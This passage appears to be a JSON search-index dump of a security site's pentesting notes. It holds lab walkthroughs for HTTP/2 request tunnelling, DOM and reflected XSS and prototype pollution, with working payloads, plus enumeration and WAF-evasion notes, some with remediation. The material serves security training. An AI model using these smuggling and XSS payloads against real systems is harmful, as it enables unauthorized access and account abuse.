it to log in. Exploitability  The application has a login function, and the database contains a table that holds usernames and passwords. An attacker needs to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users, and login as administrator.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "937746311c556d1efec9c089c2bb9b12",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/18",
    "t": "Bypassing access controls via HTTP/2 request tunnelling ",
    "c": "Bypassing access controls via HTTP/2 request tunnelling  Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. The front-end server doesn’t reuse the connection to the back-end, so isn’t vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling. Reproduction and proof of concept  Send the GET / request to Burp Repeater. Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2. Using the Inspector, append an arbitrary header to the end of the request and try smuggling a Host header in its name as follows: Name foo: bar\\r\\n Host: abc Value xyz Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names. In the browser, notice that the lab’s search function reflects your search query in the response. Send the most recent GET /?search=whatever request to Burp Repeater and upgrade it to an HTTP/2 request. In Burp Repeater, right-click on the request and select Change request method. Send the request and notice that the search function still works when you send the search parameter in the body of a POST request. Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows: Name foo: bar\\r\\n Content-Length: 500\\r\\n \\r\\n search=x Value xyz In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled Content-Length header. Send the request and observe that the response now reflects the headers that were appended to your request by the front-end server: Notice that these appear to be headers used for client authentication. Change the request method to HEAD and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers, making sure to update their values as follows: Name foo: bar\\r\\n \\r\\n GET /admin HTTP/1.1\\r\\n X-SSL-VERIFIED: 1\\r\\n X-SSL-CLIENT-CN: administrator\\r\\n X-FRONTEND-KEY: 8870149995405902\\r\\n \\r\\n Value xyz Send the request and observe that you receive an error response saying that not enough bytes were received. This is because the Content-Length of the requested resource is longer than the tunnelled response you’re trying to read. Change the :path pseudo-header so that it points to an endpoint that returns a shorter resource. In this case, you can use /login . Send the request again. You should see the start of the tunnelled HTTP/1.1 response nested in the body of your main response. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ), then update the path in your tunnelled request accordingly and resend it. Although you will likely encounter an error response, Carlos is deleted and the lab is solved. Name foo: bar\\r\\n \\r\\n GET /admin/delete?username=carlos HTTP/1.1\\r\\n X-SSL-VERIFIED: 1\\r\\n X-SSL-CLIENT-CN: administrator\\r\\n X-FRONTEND-KEY: 8870149995405902\\r\\n \\r\\n Value xyz Exploitability  An attacker will need to access the admin panel at /admin as the administrator user and delete carlos. Note: This lab supports HTTP/2 but doesn’t advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector. Please note that this feature is only available from Burp Suite Professional / Community 2021.9.1.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b40a104fc496ef62a99449c7c0a1fbf4",
    "u": "https://webapp.tymyrddin.dev/docs/xss/12",
    "t": "Reflected DOM XSS ",
    "c": "Reflected DOM XSS  Description  The website in this lab contains a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. Reproduction and proof of concept  In Burp, go to the Proxy tool and turn Intercept on. Go to the target website and use the search bar to search for a random test string. In the Proxy tool forward the request. On the Intercept tab, notice that the string is reflected in a JSON response called search-results . HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 Connection: close Content-Length: 33 {\"results\":[],\"searchTerm\":\"XSS\"} From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call. function search(path) { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { eval('var searchResultsObj = ' + this.responseText); displaySearchResults(searchResultsObj); } }; ... } Experiment with different search strings. The JSON response is escaping quotation marks. And backslash is not being escaped. Inject payload: \\\"-alert(1)}// When the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term. An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated: {\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a9d7e1381badb17df3ba975856585030",
    "u": "https://webapp.tymyrddin.dev/docs/xss/20",
    "t": "Reflected XSS in canonical link tag ",
    "c": "Reflected XSS in canonical link tag  Description  The website in this lab reflects user input in a canonical link tag and escapes angle brackets. Note: The solution to this lab is only possible in Chrome. Reproduction and proof of concept  Visit the following URL, replacing lab-id with your lab ID: https://0a8e007b03ebd129c06bf93500c800bd.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called. To trigger the exploit, press one of the following key combinations: On Windows: ALT+SHIFT+X On MacOS: CTRL+ALT+X On Linux: Alt+X",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "506bfa9ce14e34b0a18e6de899ab646c",
    "u": "https://webapp.tymyrddin.dev/docs/cors/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy CORS Labs Introduction  What?  Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). Why?  It also provides potential for cross-domain attacks, if a website’s CORS policy is poorly configured and implemented. How?  Same-origin policy (SOP) vulnerabilities CORS vulnerability with basic origin reflection CORS vulnerability with trusted null origin CORS vulnerability with trusted insecure protocols CORS vulnerability with internal network pivot attack",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cf420318a1f1831a2c847ea39e6532d5",
    "u": "https://webapp.tymyrddin.dev/docs/xss/8",
    "t": "Stored XSS into anchor href attribute with double quotes HTML-encoded ",
    "c": "Stored XSS into anchor href attribute with double quotes HTML-encoded  Description  The website in this lab contains a stored cross-site scripting vulnerability in the comment functionality. Reproduction and proof of concept  Post a comment with a random alphanumeric string in the “Website” input, then use Burp Suite to intercept the request and send it to Burp Repeater. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater. The random string in the second Repeater tab has been reflected inside an anchor href attribute. Repeat the process again, replacing the input with a payload to inject a JavaScript URL that calls alert: javascript:alert(1) Verify the technique worked by right-clicking, selecting Copy URL , and pasting the URL in the browser. Clicking the name above the comment should now trigger an alert.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "140c4c4b86326d2415ab5d99a1f78ada",
    "u": "https://webapp.tymyrddin.dev/docs/business/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Business logic vulnerabilities Labs Introduction  What?  Business (application) logic flaws are often the most critical in terms of consequences, as they are deeply tied into the company’s process. Why?  Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to elicit unintended behaviour. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal. How?  Application logic errors and broken access control vulnerabilities Excessive trust in client-side controls High-level logic vulnerability Inconsistent security controls Flawed enforcement of business rules Low-level logic flaw Inconsistent handling of exceptional input Weak isolation on dual-use endpoint Insufficient workflow validation Authentication bypass via flawed state machine Infinite money logic flaw Authentication bypass via encryption oracle",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c4930e5fc5aea685aa9a209f0eee9774",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/5",
    "t": "Client-side prototype pollution via browser APIs ",
    "c": "Client-side prototype pollution via browser APIs  Description  This lab is vulnerable to DOM XSS via client-side prototype pollution. The website’s developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they’ve taken. Also see Widespread prototype pollution gadgets . Reproduction and proof of concept  Load the lab in Burp’s built-in browser. Enable DOM Invader and enable the prototype pollution option. Open the browser DevTools panel, go to the DOM Invader tab, then reload the page. Observe that DOM Invader has identified two prototype pollution vectors in the search property i.e. the query string. Click Scan for gadgets . A new tab opens in which DOM Invader begins scanning for gadgets using the selected source. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab. Observe that DOM Invader has successfully accessed the script.src sink via the value gadget. Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls alert(1) . Exploitability  An attacker will need to find a source that you can use to add arbitrary properties to the global Object.prototype ; identify a gadget property that allows you to execute arbitrary JavaScript; and combine these to call alert() .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e2866fe5dca6d9158bea328181902efd",
    "u": "https://api.tymyrddin.dev/",
    "t": "API mayhem ",
    "c": "API mayhem  She stood on the bridge and frowned: To bridge over something had led to building bridges. But was it a bridge too far? Was the gap not too wide?” She turned to look at the other side, “I’ll cross that bridge when I come to it. No need burning it now.” An API is a technology that enables communication between different applications. API Penetration Testing is a type of security testing performed on application programming interfaces (APIs) to assess the strength of the security controls in place. Test lab API tools Preparation Reconnaissance Enumeration Notes on techniques Introduction Challenges Rate limit tests Collect requests information Fuzz deep and wide Evasive techniques Attack authentication Exploit authorisation Inject with mass assignment Try traditional injections CTFs and challenges Introduction RootMe: GraphQL Introspection",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9a42586ea59507302b8ca35925568fd8",
    "u": "https://api.tymyrddin.dev/docs/notes/evade",
    "t": "Evasive techniques ",
    "c": "Evasive techniques  To be able to trick the API when security controls are in place, such as a WAF that scans requests for common attacks, input validation that restricts the type of input, or a rate limit that restricts how many requests can be sent: Add string terminators to attacks Add case switching to attacks Encode payloads Combine different evasion techniques Rinse and repeat Apply evasive techniques to all attacks",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fea977934b95fe94aaade2683bc8dd06",
    "u": "https://api.tymyrddin.dev/docs/ctf/introspection",
    "t": "RootMe: GraphQL Introspection ",
    "c": "RootMe: GraphQL Introspection  RootMe Challenge GraphQL - Introspection : First steps in exploring a GraphQL schema with the introspection feature. There are some major differences between RESTful APIs and GraphQL APIs. The same hacking techniques used for RESTful APIs can be adapted for hacking GraphQL. Introspection  Introspection is the ability to query which resources are available in the current API schema. Given the API, via introspection, we can see the queries, types, fields, and directives it supports. In BurpSuite end the POST /rocketql HTTP/1.1 request to Repeater and adapt it with a query for GraphQL introspection: {\"query\":\"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\"} Response  Open GraphQL Voyager and click on CHANGE SCHEMA. Go to the Introspection tab and paste the schema from the response. Fiddling  nothingherelol , was to be expected as the object was called IAmNotHere . Time to explore further … Resources  GraphQL - Query GraphQL - GraphQL.pdf GraphQL - grahql.pdf InQL (Burp Suite) righettod/poc-graphql dolevf/Damn-Vulnerable-GraphQL-Application Looting GraphQL Endpoints for Fun and Profit",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4897615f4a9d8f6ce0a32a95b39dc720",
    "u": "https://api.tymyrddin.dev/docs/notes/requests",
    "t": "Collect requests information ",
    "c": "Collect requests information  Discover the format of API requests from its documentation, specification, and some reverse engineering, and use these sources to build Postman collections for further analysis. Find information in documentation and add to Postman Find and import API specification in Postman Reverse engineer an API with Postman Manually build a Postman collection Build a Postman collection by proxy",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1c5a6c57ac8af2512aff5d7735c05d",
    "u": "https://enum.tymyrddin.dev/docs/app/api",
    "t": "Scanning an API ",
    "c": "Scanning an API  There are two main architectural styles used in modern APIs: SOAP: a highly structured message protocol that supports multiple low-level protocols. REST: a simpler approach to APIs using HTTP/S as the transport protocol, and typically using JSON format for data transfer. Both types of APIs support HTTP requests and responses and Secure Sockets Layer (SSL), but the similarity ends there. The increase of API-related security threats in recent years has prompted the Open Web Application Security Project (OWASP) to release the API Security Top 10, which helps raise awareness of the most serious API security issues affecting organizations. Use either the ZAP-API Scan or Burp API scan . Resources  OWASP API Security Project",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "098c1e5cdd78323ada26496c43d9d2ee",
    "u": "https://enum.tymyrddin.dev/docs/system/dns",
    "t": "DNS enumeration ",
    "c": "DNS enumeration  DNS enumeration is possible by sending zone transfer requests to the DNS primary server pretending to be a client. DNS enumerating reveals sensitive domain records in response to the request. Tools  DNS enumeration tools Remediation  Configure DNS servers not to send DNS zone transfers to unauthenticated hosts. Make sure DNS zone transfers do not contain HINFO information. Trim DNS zone files to prevent revealing unnecessary information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a024b71865d68290052537f1448d20b6",
    "u": "https://enum.tymyrddin.dev/docs/app/automated",
    "t": "Automated vulnerability scanning ",
    "c": "Automated vulnerability scanning  Pros and cons of using Automated vulnerability scanners : Advantages  Automated scans are easy to repeat, and the results can be shared within a team with ease. These scanners are quick and can test numerous applications efficiently. Open-source solutions exist. Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. Disadvantages  People can often become reliant on these tools. They are extremely “loud” and produce a lot of traffic and logging. This is not good if you are trying to bypass security controls. Open-source solutions are often basic and require expensive licenses to have useful features. They often do not find every vulnerability on an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "af269ce6c0ea692e34a159f21705ac1e",
    "u": "https://enum.tymyrddin.dev/docs/system/snmp",
    "t": "SNMP enumeration ",
    "c": "SNMP enumeration  Default SNMP passwords allow attackers to view or modify the SNMP configuration settings. Attackers can enumerate SNMP on remote network devices for: Information about network resources such as routers, shares, devices, etc. ARP and routing tables Device specific information Traffic statistics And more. Tools  SNMP enumeration tools Remediation  Minimize the attack surface by removing the SNMP agents where not needed. Change default public community strings. Upgrade to SNMPv3, which encrypts the community strings and messages. Implement group policy for additional restriction on anonymous connections. Implement firewalls to restrict unnecessary connections. Implement IPSec filtering. Block access to TCP/UDP ports 161. Encrypt and authenticate using IPSEC.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f26fd1b6a07d6de4a8e205edf448574",
    "u": "https://enum.tymyrddin.dev/docs/overview",
    "t": "Enumeration overview ",
    "c": "Enumeration overview  Enumerate hosts on the network using Zenmap. Zenmap is a version of Nmap that has a graphical interface. Use Zenmap to create a network topology to help identify the network layout. Try to enumerate users and groups. Try to get a list of SMB shares on the system. Enumerate uniform resource locators (URLs) and retrieve any web pages. Identifying the software running on a system can be tricky. Get creative. For example, use Ncrack to do a dictionary attack on the administrator account and then supply that as the credentials to a script to see a list of the processes running on that system. Get lists of services running on a system by performing an nmap scan. Try to obtain security tokens. Enumerate social media posts by a user with a given IP address by using a tool like recon-ng . A full scan does a variety of tests to identify vulnerabilities in the system. For example, Nessus can be set to use a number of plug-ins such as for checking for security issues with Simple Mail Transfer Protocol (SMTP) and Simple Network Management Protocol (SNMP) services, checking for Linux security issues, and checking for web server and Windows vulnerabilities, etc. Such scans are considered to be aggressive. If red teaming or hired to do a penetration test where the security team is not informed of our presence, we can do a stealth scan and are to put more effort into choosing specific scanning techniques to avoid detection by the blue/security team, for example by not scanning the full IP range sequentially, or scanning ports sequentially, and by using multiple source IP addresses to scan from. Compliance scanning by externals has its own rules and requirements. For example, for compliance with the Payment Card Industry Data Security Standard (PCI DSS) standards, these include: Both internal and external scans must be performed. External scans must be approved by an approved scanning vendor (ASV). Vulnerability scans are to be done quarterly and after any major change to the environment. If critical vulnerabilities are found, they must be remediated and then a new scan done to validate the remediation steps have removed the vulnerability. When doing a vulnerability scan on target systems, do it multiple times, as an anonymous, non-credentialed user, and as a credentialed user with and without administrative credentials. As a non-credentialed user we are not to see information such as the password policies configured, group membership, and other configuration settings. As a credentialed user with an administrative account, we may get information about the configuration of the system including vulnerabilities related to user accounts (for example an account called “administrator” or “admin”) and group membership (too many users in the administrators group), missing patches, and password policy configuration settings.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea87b6ea64a6f9ab6b5d2083ad091f52",
    "u": "https://enum.tymyrddin.dev/docs/system/netbios",
    "t": "NetBios enumeration ",
    "c": "NetBios enumeration  NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. NetBIOS software runs on port 139 on the Windows operating system. File and printer services need to be enabled to enumerate NetBIOS over Windows. An attacker can perform the following on the remote machine: Choosing to read or write to a remote machine, depending on the availability of shares. Launching a Denial of Service (DoS) attack on the remote machine. Enumerating password policies on the remote machine. Tools  NetBios enumeration tools Remediation  Minimise the attack surface by minimising the unnecessary service like Server Message Block (SMB). Remove file and printer sharing in Windows OS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "454ff8ca59627211003a08a68be3a771",
    "u": "https://enum.tymyrddin.dev/docs/vulns/mapping",
    "t": "Mapping vulnerabilities to exploits ",
    "c": "Mapping vulnerabilities to exploits  Attack tree  1 List and score exploitable vulnerabilities 1.1 by Common Vulnerability Scoring System (CVSS) (OR) 1.1.1 Calculate Exploitability 1.1.2 Calculate Impact 1.1.3 f(Impact) 1.1.4 BaseScore 1.2 by Vulnerability Priority Rating (VPR) 2 Prioritisation possibilities 2.1 Severity level 2.2 Vulnerability exposure 2.3 Criticality Common Vulnerability Scoring System (CVSS)  The Common Vulnerability Scoring System (CVSS) is a standard vulnerability scoring system used by vulnerability scanners to identify the severity of the vulnerability. A CVSS base score can be a number from 0 to 10, with 0 being the least severe, and 10 being the most severe. The format of the base score for CVSS2: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C Three metrics are used to calculate the exploitability of a vulnerability: The access vector (AV), used to measure how the hacker executes the exploit. Does she have to have physical access to the system, be in an adjacent network and use pivoting, or is the vulnerability exploitable from a remote network? The attack complexity (AC), to describe how easy or difficult it is to exploit the vulnerability. Authentication (Au), used to specify how many times she would need to authenticate to exploit the vulnerability. Exploitability = 20 * AV * AC * Au Impact metrics are used to identify what the impact of the exploit is on the confidentiality (C), integrity (I), and availability (A) of systems and their data. The values can be None (N), Partial (P) or Complete (C) Impact = 10.41 * (1-(1-C)*(1-I)*(1-A)) f(Impact) = 0 if Impact = 0, 1.176 otherwise. End score: BaseScore = roundToOneDecimal(( (0.6*Impact) + (0.4*Exploitability)-1.5) * f(Impact)) Vulnerability Priority Rating (VPR)  The VPR framework is a more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS). Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages. VPR uses a similar scoring range as CVSS. Two notable differences are that VPR does not have a None/Informational category, and because VPR uses a different scoring method (youtube) , the same vulnerability will have a different score using VPR than when using CVSS. Nessus  In Nessus, the Vulnerability Information includes whether known exploits are available for a vulnerability. The section labeled “Exploitable With” even shows what tools can be used to exploit the vulnerability. Real Risk Score (RRS)  Real Risk Score (RRS) not only takes into account the equation behind the CVSS of each vulnerability, but also the Metasploit modules that could be launched against it, the malware kits detected, and even how old the vulnerability is. Resources  NVD CVSS v2 Calculator NVD CVSS v3 Calculator Vulnerability Priority Rating (VPR) Summary Real Risk Score",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfeaea289a0f4fb49ef8e455286cfe4b",
    "u": "https://enum.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Application scanning tools can be used to perform an audit on an application. There are basically two types of application audit tools: A dynamic analysis tool assesses vulnerabilities in an application by analysing the behaviour of the application while it is running (how it responds to input). The best is a combination of scanning and using scanners like Zap and Burp in a manual walkthrough. In a static analysis, the source code is reviewed for vulnerabilities. Can be done manually or using an automated vulnerability scanner. Use both for manual and automated scanning of the application. Why?  Move further and deeper into the scanning process to include security scanning and discover vulnerabilities to exploit. How?  Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "275316b5407eae7e98bb36d23e19b8a5",
    "u": "https://enum.tymyrddin.dev/docs/vulns/prioritisation",
    "t": "Prioritisation of vulnerabilities ",
    "c": "Prioritisation of vulnerabilities  Asset categorisation — how critical is the system that has vulnerabilities? Adjudication — making a decision on whether the vulnerability discovered is a false positive. Review and validate. Prioritisation of vulnerabilities — if a vulnerability exploits confidentiality, integrity, or availability, then that vulnerability would typically take priority. Common Vulnerability Scoring System (CVSS)  Advantages  CVSS has been around for a long time. CVSS is popular in organisations. CVSS is a free framework to adopt and recommended by organisations such as NIST. Disadvantages  CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity. CVSS heavily assesses vulnerabilities on an exploit being available. Only 20% of all vulnerabilities have an exploit available ( Tenable., 2020 ). Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found. Vulnerability Priority Rating (VPR)  Advantages  VPR is a modern framework that is real-world. VPR considers over 150 factors when calculating risk. VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. Disadvantages  VPR is not open-source like some other vulnerability management frameworks. VPR can only be adopted separate from a commercial platform. VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR. Real Risk Score (RRS)  Real Risk Score (RRS) may offer a good alternative. It enriches CVSS data to provide a more precise risk score.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f9f57e43799169b1563d26179028d219",
    "u": "https://enum.tymyrddin.dev/docs/app/scanning",
    "t": "Dynamic web application scanning ",
    "c": "Dynamic web application scanning  Features of the two main web application scanners (community versions): Feature Burp Suite Community Edition OWASP ZAP Burp Suite Pro Web Application Scanning Not Available Available with basic security vulnerabilities Available with quality security vulnerabilities Intercepting Feature Available Available Available Fuzzing Capabilities Available Available Available Encoder and Decoder Available Not Available Available Cost Free Free Paid Subscription Advanced Functionality ($450 per year) Documentation Extensive Little Extensive Spider Available Available Available Updates Available Available Available Extensions Less Options No provision for enhance functionality Available Coverage Medium coverage Less coverage Extensive Coverage False Positive Less More Less Session Token Entropy Analysis Available Not Available Available Comparison Feature Available Not Available Available",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d60a0f3306d489a4438058abb064816a",
    "u": "https://enum.tymyrddin.dev/docs/vulns/more",
    "t": "Discovering more vulnerabilities/exploits ",
    "c": "Discovering more vulnerabilities/exploits  Attack tree  1 Known vulnerabilities/exploits (AND) 1.1 Look up in Exploit databases 1.2 Vulnerability scanning 2 Latent vulnerabilities (AND) 2.1 Security code reviews 2.2 Specific code scanning for vulnerabilities 3 New vulnerabilities 3.1 Root cause analysis 3.2 Variant analysis 3.3 Patch analysis 3.4 Exploit technique analysis 4 New exploits 4.1 Proof-of-concept development (exploit development) 4.2 Cross-compiling 4.3 Modifying an existing exploit 4.4 A new exploit chain (a new on-path) Notes  Manual security code reviews  Manual security code reviews are usually performed by developers or security experts. Such efforts usually take place during a security push or pentesting engagement and are associated with a final security review. Coding errors can be found using different approaches, but even when compared to sophisticated tools, manual code reviews have clearly proven their value in the areas of precision and quality. Unfortunately, manual code reviews are also the most expensive to execute. It is important the developers are not part of the team that created the code, and a facilitator/security professional is also a good idea. New vulnerabilities  New vulnerabilities are usually found through bug bounty programs, or researched by dedicated groups like Google Project Zero. New exploits  Developing your own exploit is a great way to demonstrate proof of concept that the exploit can happen without focusing on performing malicious activity on the target system. Cross-compiling by downloading the source code of an existing exploit and compiling it for another platform. Modifying the exploit to fit your needs before compiling the exploit is also a good option. Exploit chaining uses a combination of different exploits run one after the other. Resources known vulnerabilities  0-days In-the-Wild Blackhat 2020: Reversing the Root (pdf of slides)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "55e2a7ec52f92c0d92359d62332a0fd3",
    "u": "https://enum.tymyrddin.dev/docs/system/cloud",
    "t": "Scanning cloud infrastructure ",
    "c": "Scanning cloud infrastructure  Most internet resources on cloud providers, like load balancers, content distribution networks, S3 buckets, etc., regularly rotate their IP addresses. If the nmap takes too long, the addresses will have been assigned to another customer and the results will no longer be relevant. Scan domain names, not IP addresses. nmap -F -sV -iL domains.txt -oA results Spotting hidden relationships  Consider the core business and what other servers and datastores there are likely to be. Keep an eye open for information that might indicate where to find those.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54522f627bbdd621763a16e528931aea",
    "u": "https://enum.tymyrddin.dev/docs/system/ntp",
    "t": "NTP enumeration ",
    "c": "NTP enumeration  An attacker can enumerate the following information by querying an NTP server. List of hosts connected to the NTP server Internal client IP addresses, hostnames and operating system used Tools  NTP enumeration tools Remediation  Restrict the usage of NTP and enable the use of NTPSec, where possible. Filter the traffic with IPTables. Enable logging for the messages and events.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "87c7f8b3aca09a9b29a4f4d7273e785b",
    "u": "https://enum.tymyrddin.dev/docs/vulns/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discover vulnerabilities: Known vulnerabilities are the simplest vulnerabilities which have been discovered and disclosed. These are often found in the libraries and frameworks that are part of an application. These vulnerabilities tend to get hit very quickly (hours) after disclosure by automated attacks from all over the world, so response speed is critical. Latent vulnerabilities are instances of typical vulnerability classes.: buffer overflows, cross-site scripting (XSS) and SQL injection for example.These vulnerabilities are not listed in databases – these are unique to each application. New vulnerabilities represent a new class of vulnerability. These appear at a slow rate, maybe one or two per year. After discovery, research and confirmations, these turn into latent vulnerabilities. There is a learning curve on these new vulnerabilities for attackers and defenders. This type of research is expensive and for most companies unlikely to produce much payoff in terms of overall risk reduction. Why?  To compromise the security of the system and potentially gain full access to the system. How?  Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36d98026c869ed6b8d5fb4b4f6dc6d45",
    "u": "https://enum.tymyrddin.dev/docs/system/ldap",
    "t": "LDAP enumeration ",
    "c": "LDAP enumeration  LDAP supports anonymous remote queries on the server. The query will disclose sensitive information such as usernames, address, contact details, etc. Tools  LDAP enumeration tools Remediation  Use SSL to encrypt LDAP communication Use Kerberos to restrict the access to known users Enable account lockout to restrict brute-forcing Create a few Active Directory Decoy accounts Enable auditing on those accounts Run Bloodhound’s Sharphound tool Perform LDAP Reconnaissance activities within the active directory environment Detect the activities in Windows event logs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "107794ffefe7d0da979c234ae03f2a2e",
    "u": "https://enum.tymyrddin.dev/docs/app/binaries",
    "t": "Download or obtain and decompile binaries ",
    "c": "Download or obtain and decompile binaries  Download or obtain binaries and then use a decompiler to analyse the binary . Review the application in a debugger. Look for information such as remote systems the application connects to, database connection strings, or usernames and passwords used by the application (there may be a backdoor).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6e186f91b8d4679c6f5a5c847724c8",
    "u": "https://enum.tymyrddin.dev/docs/system/linux",
    "t": "Linux enumeration ",
    "c": "Linux enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if linux shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc. Various built-in commands and utilities Tools  Linux enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90a4cd9ec2bd9e8e4a00397f11ccfa44",
    "u": "https://enum.tymyrddin.dev/docs/system/smtp",
    "t": "SMTP enumeration ",
    "c": "SMTP enumeration  SMTP provides three built-in commands: VRFY: Validate users on the SMTP servers EXPN: Delivery addresses of aliases and mailing lists RCPT TO: Defines the recipients of the message SMTP servers respond differently to the commands mentioned above, and SMTP enumeration is possible due to varied responses. Attackers can determine the valid users on the SMTP servers with the same technique. Tools  SMTP enumeration tools Remediation  Ignore email responses from unknown recipients. Disable open relay functionality. Prune any sensitive information like mail server and localhost in the mail responses.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e51a3a5b7a01adf9feec37ef369c98d7",
    "u": "https://enum.tymyrddin.dev/docs/system/windows",
    "t": "Windows enumeration ",
    "c": "Windows enumeration  Get information: Usernames Default configurations Default passwords Domain names Computer names Shares Windows information Network information like DNS , SMTP , SNMP information Application details Banners Routing tables Tools  Windows enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "517b315e6fd40e47e801db5896d51370",
    "u": "https://enum.tymyrddin.dev/docs/system/macos",
    "t": "macOS enumeration ",
